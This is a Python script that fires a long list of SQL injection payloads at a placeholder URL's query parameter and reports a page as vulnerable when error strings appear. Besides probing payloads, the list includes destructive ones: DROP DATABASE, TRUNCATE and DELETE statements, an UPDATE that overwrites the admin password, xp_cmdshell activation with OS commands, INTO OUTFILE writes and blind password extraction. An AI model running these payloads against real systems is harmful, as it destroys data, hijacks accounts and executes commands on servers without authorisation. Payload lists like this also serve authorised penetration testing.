import requests

SQL_INJECTION_PAYLOADS = [
    # Add the additional payloads here
    "1 AND (SELECT COUNT(*) FROM users) = 1 --",
    "1' AND 1=1 UNION SELECT 1,2,3 FROM information_schema.tables --",
    "1' UNION SELECT 1, @@version, 3 --",
    "1 AND 1=1 INTO OUTFILE '/var/www/html/test.txt' --",
    "1 AND 1=1; EXEC xp_cmdshell('echo Vulnerable') --",
    "1' AND (SELECT TOP 1 name FROM sysobjects WHERE xtype='U')='users' --",
    "1 OR (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
    "1 AND 1=1 ORDER BY 1 --",
    "1' ORDER BY 1--",
    "1' UNION SELECT null, table_name FROM information_schema.tables --",
    "1' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users' --",
    "1 AND 1=1 UNION SELECT table_name, column_name FROM information_schema.columns --",
    "1 AND 1=1",
    "1 AND 1=2",
    "1' AND 1=1 --",
    "1' AND 1=2 --",
    "1' AND 'a'='a",
    "1' AND 'a'='b",
    "1\" AND 1=1 --",
    "1\" AND 1=2 --",
    "1\" AND \"a\"=\"a",
    "1\" AND \"a\"=\"b",
    "1 OR 1=1",
    "1 OR 1=2",
    "1 OR 'a'='a'",
    "1 OR 'a'='b'",
    "1 OR \"a\"=\"a\"",
    "1 OR \"a\"=\"b\"",
    "1; SELECT 1,2,3 --",
    "1; INSERT INTO logs (log_data) VALUES ('SQL Injection') --",
    "1; UPDATE users SET password='hacked' WHERE username='admin' --",
    "1; DELETE FROM sensitive_data WHERE 1=1 --",
    "1 UNION SELECT NULL, table_name FROM information_schema.tables --",
    "1 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' --",
    "1 AND (SELECT COUNT(*) FROM users) > 0 --",
    "1 AND (SELECT COUNT(*) FROM users) = 0 --",
    "1; WAITFOR DELAY '0:0:10' --",
    "1; DROP TABLE IF EXISTS temp_data --",
    "1' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) --",
    "1' AND 1=(SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END) --",
    "1' AND 1=(SELECT CASE WHEN (username='admin') THEN 1 ELSE 0 END) --",
    "1' AND 1=(SELECT CASE WHEN (username='john') THEN 1 ELSE 0 END) --",
    "1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; --",
    "1; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE WITH OVERRIDE; --",
    "1; EXEC master.dbo.xp_cmdshell 'echo Vulnerable'; --",
    "1'; EXEC xp_cmdshell('echo Vulnerable'); --",
    "1' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password, 1, 1)='a') --",
    "1' OR EXISTS(SELECT * FROM users WHERE username='admin' AND 1=(SELECT COUNT(*) FROM sensitive_data)) --",
    "1 AND 1=0",
    "1 OR 1=0",
    "1; DROP DATABASE users; --",
    "1; TRUNCATE TABLE users; --",
    "1; SELECT * FROM users WHERE username='admin' AND password IS NULL; --",
    "1; SELECT * FROM users WHERE username='admin' OR 1=1; --",
    "1; SELECT * FROM users WHERE username='admin' AND 'password'='password'; --",
    "1; SELECT * FROM users WHERE username='admin' AND 'password' LIKE '%a%'; --",
    "1; SELECT * FROM users WHERE username='admin' AND 'password'='a'+'b'; --",
    "1; SELECT * FROM users WHERE username='admin' AND 1=CONVERT(int, '1'); --",
    "1; SELECT * FROM users WHERE username='admin' AND 1=CONVERT(int, 'a'); --",
    "1; SELECT * FROM users WHERE username='admin' AND 1=CONVERT(int, '1a'); --",
    "1; SELECT * FROM users WHERE username='admin' AND 1=CAST('1' AS int); --",
    "1; SELECT * FROM users WHERE username='admin' AND 1=CAST('a' AS int); --",
    "1; SELECT * FROM users WHERE username='admin' AND 1=CAST('1a' AS int); --",
    "1' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'a%') > 0 --",
    "1' AND (SELECT COUNT(*) FROM users WHERE username LIKE '%a%') > 0 --",
    "1' AND (SELECT COUNT(*) FROM users WHERE username NOT LIKE '%a%') > 0 --",
    "1; EXEC sp_who2; --",
    "1; EXEC xp_cmdshell('whoami'); --",
    "1' AND 1=CAST(1 AS bit) --",
    "1' AND 1=CAST(0 AS bit) --",
    "1 AND EXISTS(SELECT 1 FROM users WHERE username='admin' AND password='password') --",
    "1 AND EXISTS(SELECT 1 FROM users WHERE username='admin' AND password='password' AND 1=1) --",
    "1 AND EXISTS(SELECT 1 FROM users WHERE username='admin' AND password='password' AND 1=2) --",
    "1' AND EXISTS(SELECT 1 FROM users WHERE username='admin' AND password='password') --",
    "1' AND EXISTS(SELECT 1 FROM users WHERE username='admin' AND password='password' AND 1=1) --",
    "1' AND EXISTS(SELECT 1 FROM users WHERE username='admin' AND password='password' AND 1=2) --",
    "1 AND (SELECT COUNT(*) FROM users) > 1 --",
    "1 AND (SELECT COUNT(*) FROM users) = 1 --",
    "1 AND (SELECT COUNT(*) FROM users) < 1 --",
    "1 AND (SELECT COUNT(*) FROM users) >= 1 --",
    "1 AND (SELECT COUNT(*) FROM users) <= 1 --",
    "1' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END) --",
    "1' AND 1=(SELECT CASE WHEN (1=2) THEN 1 ELSE 1/0 END) --",
    "1' AND 1=(SELECT CASE WHEN (username='admin') THEN 1 ELSE 1/0 END) --",
    "1' AND 1=(SELECT CASE WHEN (username='john') THEN 1 ELSE 1/0 END) --",
]

target_url = "https://example.com/vulnerable_page"  # Replace with the URL of the vulnerable page

def check_vulnerability(payload):
    url_with_payload = f"{target_url}?param={payload}"
    response = requests.get(url_with_payload)

    # Modify the following condition based on the expected behavior for your specific case
    if "Error" in response.text or "Syntax error" in response.text:
        print(f"Vulnerable to SQL injection with payload: {payload}")
    else:
        print(f"Not vulnerable with payload: {payload}")

def main():
    for payload in SQL_INJECTION_PAYLOADS:
        check_vulnerability(payload)

if __name__ == "__main__":
    main()